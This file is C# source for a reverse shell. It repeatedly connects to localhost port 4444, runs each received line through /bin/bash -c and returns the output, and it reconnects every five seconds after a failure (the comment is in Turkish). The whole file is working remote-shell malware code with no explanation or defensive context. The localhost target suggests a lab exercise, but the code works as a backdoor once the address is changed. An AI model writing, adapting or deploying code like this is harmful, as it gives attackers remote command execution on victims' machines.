using System;
using System.IO;
using System.Diagnostics;
using System.Net.Sockets;
using System.Threading;


while (true)
{
    try
    {
        using (TcpClient client = new TcpClient("localhost", 4444))
        {
            using (Stream stream = client.GetStream())
            using (StreamReader reader = new StreamReader(stream))
            using (StreamWriter writer = new StreamWriter(stream))
            {
                while (true)
                {
                    writer.Write("$ ");
                    writer.Flush();
                    string cmd = reader.ReadLine();

                    if (string.IsNullOrEmpty(cmd))
                    {
                        client.Close();
                        return;
                    }
                    else
                    {
                        // ...
                        var cmdProcess = new Process
                        {
                            StartInfo = new ProcessStartInfo
                            {
                                FileName = "/bin/bash",
                                Arguments = "-c \"" + cmd + "\"",
                                UseShellExecute = false,
                                RedirectStandardOutput = true
                            }
                        };

                        cmdProcess.Start();

                        writer.Write(cmdProcess.StandardOutput.ReadToEnd());
                        writer.Flush();
                    }
                }
            }
        }
    }
    catch (Exception ex) when (ex is SocketException || ex is IOException)
    {
        // Baglanti olmamasi durumunda bekleme ve yeniden baglanma
        Thread.Sleep(5000);
    }
}